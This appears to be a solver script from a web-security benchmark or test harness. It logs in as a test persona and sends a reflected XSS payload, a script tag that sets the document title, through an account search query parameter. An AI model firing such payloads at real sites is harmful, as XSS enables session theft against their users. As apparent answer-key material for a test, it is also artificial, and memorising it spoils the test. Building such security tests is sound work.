// Reflected XSS via the account search banner: submit a query term containing active markup and read
// the rendered HTML fragment back, where the banner echoes the term unescaped.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const qKey = ctx.plan.params.searchQuery ?? 'q'
  const payload = '<script>document.title="pwned"</script>'
  const path = `${ctx.plan.routes.accountSearch!.path}?${encodeURIComponent(qKey)}=${encodeURIComponent(payload)}`
  await ctx.fetch(path, { method: 'GET' })
}
